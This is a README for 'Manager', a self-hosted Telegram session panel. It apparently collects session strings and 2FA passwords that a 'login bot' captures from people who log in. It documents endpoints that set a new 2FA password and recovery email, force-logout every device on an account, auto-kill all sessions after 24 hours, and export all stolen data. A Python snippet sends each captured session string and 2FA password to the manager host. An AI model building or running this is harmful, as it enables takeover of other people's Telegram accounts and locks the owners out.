# Manager

Self-hosted Telegram session manager. Capture sessions from your existing login bot, then manage devices, 2FA, mail, protection, and 24h auto-logout from a single responsive web UI.

## Stack

- Python 3 + Flask + Telethon
- SQLite (persistent, single file `manager.db`)
- Vanilla JS frontend (dark, mobile-first, no build step)
- Optional Cloudflare tunnel for public HTTPS

## Features

- **Dashboard** — total sessions, today's new, protected count, 2FA count, pending auto-logout, auto-logout status
- **Sessions tab** — every captured session with phone / name / username / 2FA / email / protected / current badges, full search + filters, per-row actions
- **Devices** — live `GetAuthorizationsRequest` per account; per-device logout via `ResetAuthorizationRequest`; "logout all others" button
- **2FA** — read current 2FA status (hint, recovery email); set new cloud password + hint + recovery email
- **Email** — attach an email label to each session
- **Protect** — protected sessions are never auto-logged-out
- **Set Current** — marks the device you're managing from (excluded from "logout others" highlights)
- **Force Logout** — kills ALL authorizations on a Telegram account in one click
- **Detail modal** — full session data incl. captured 2FA password, notes editor, copy-session-string to clipboard
- **Auto-logout toggle** — when ON, every new session gets a 24h timer (configurable hours). When timer fires: all authorizations on that account are killed via Telethon. Fires once per session. Protected / current sessions are skipped.
- **Activity log** — every action (session added, protect toggled, device logged out, 2FA set, auto-logout fired, …) is recorded with timestamp
- **Export JSON** — one-click download of all session data
- **Password gate** — single admin password (default `manager123`, change in Settings)
- **Ingest endpoint** — POST your existing login bot's `verify_op()` result to `/api/ingest` and Manager stores it

## Quick start

```bash
git clone https://github.com/ImAshhhhh/manager.git
cd manager
cp .env.example .env
nano .env       # set API_ID, API_HASH, BOT_TOKEN, LOG_CHANNEL_ID
./start.sh
```

Open `http://localhost:5001` — password is `manager123`.

For public HTTPS:

```bash
USE_TUNNEL=1 ./start.sh
```

## Wiring your login bot to Manager

In your existing bot's `verify_op()` (after `StringSession.save(client.session)`), POST the result to Manager:

```python
import requests

requests.post(
    "https://<your-manager-url>/api/ingest",
    headers={
        "Content-Type": "application/json",
        # only if INGEST_TOKEN is set in Manager's .env:
        "X-Ingest-Token": "your-secret-token",
    },
    json={
        "phone": phone,
        "user_id": me.id,
        "username": me.username,
        "name": me.first_name,
        "session_string": ss,
        "twofa_password": password,  # captured 2FA password if any
    },
    timeout=10,
)
```

Manager dedupes by phone. Re-ingesting the same phone updates the session_string, user_id, username, name, 2FA password, and last_seen — keeping your dashboard in sync every time someone re-logs in.

## Auto-logout semantics

- Toggle ON in Settings → every session currently without a timer gets one (`now + 24h`), and every new session inserted afterwards gets one on insert.
- Background worker checks every 60s. Any session with `auto_logout_fired = 0` and `auto_logout_at <= now` triggers:
  - If `is_protected = 1` → skipped (marked fired, audit-logged as `auto_logout_skipped`)
  - Else → Telethon `ResetAuthorizationRequest` for every authorization on that account → audit-logged as `auto_logout_fired`
- Toggle OFF → no new timers added; existing pending timers still fire once.
- "Fires once per session" is enforced by `auto_logout_fired` flag.

## Endpoints

| Method | Path | Auth | Purpose |
|---|---|---|---|
| GET | `/` | session | Login page (if not authed) or app |
| POST | `/api/login` | – | `{password}` → cookie |
| POST | `/api/logout` | session | Clears session |
| GET | `/api/me` | – | `{admin: bool}` |
| POST | `/api/ingest` | optional token | Capture session from login bot |
| GET | `/api/dashboard` | admin | Stats |
| GET | `/api/sessions` | admin | List |
| GET | `/api/sessions/<id>` | admin | Full detail (incl. session_string + 2FA password) |
| DELETE | `/api/sessions/<id>` | admin | Remove from DB |
| POST | `/api/sessions/<id>/protect` | admin | `{value: bool}` |
| POST | `/api/sessions/<id>/current` | admin | `{value: bool}` |
| POST | `/api/sessions/<id>/mail` | admin | `{email}` |
| POST | `/api/sessions/<id>/notes` | admin | `{notes}` |
| GET | `/api/sessions/<id>/devices` | admin | List authorizations |
| POST | `/api/sessions/<id>/logout-device` | admin | `{hash}` |
| POST | `/api/sessions/<id>/logout-others` | admin | Kill all except current |
| POST | `/api/sessions/<id>/force-logout` | admin | Kill ALL authorizations |
| GET | `/api/sessions/<id>/2fa-status` | admin | Has 2FA / hint / recovery |
| POST | `/api/sessions/<id>/2fa` | admin | Set new password + hint + email |
| GET/POST | `/api/settings` | admin | Read / update settings |
| GET | `/api/audit?limit=100` | admin | Activity log |
| GET | `/api/export` | admin | JSON dump of all sessions |

## Files

```
manager/
├── app.py             # Flask routes
├── db.py              # SQLite layer + audit
├── telegram_ops.py    # Telethon calls (devices, 2FA, force-logout)
├── auto_logout.py     # Background 24h worker
├── start.sh           # Bootstrap script
├── requirements.txt
├── .env.example
├── .gitignore
├── README.md
└── static/
    ├── login.html
    ├── index.html
    ├── style.css
    └── app.js
```

## Stop

```bash
pkill -f 'python.*app.py'
pkill cloudflared  # if tunnel was started
```

## Notes

- `manager.db` is git-ignored. Back it up regularly.
- Sessions captured via the login bot contain the raw `StringSession` and the 2FA password (if you captured it). The DB file is the crown jewels — protect the host.
- Telethon calls run in a dedicated asyncio loop on a background thread so they don't block Flask request threads.
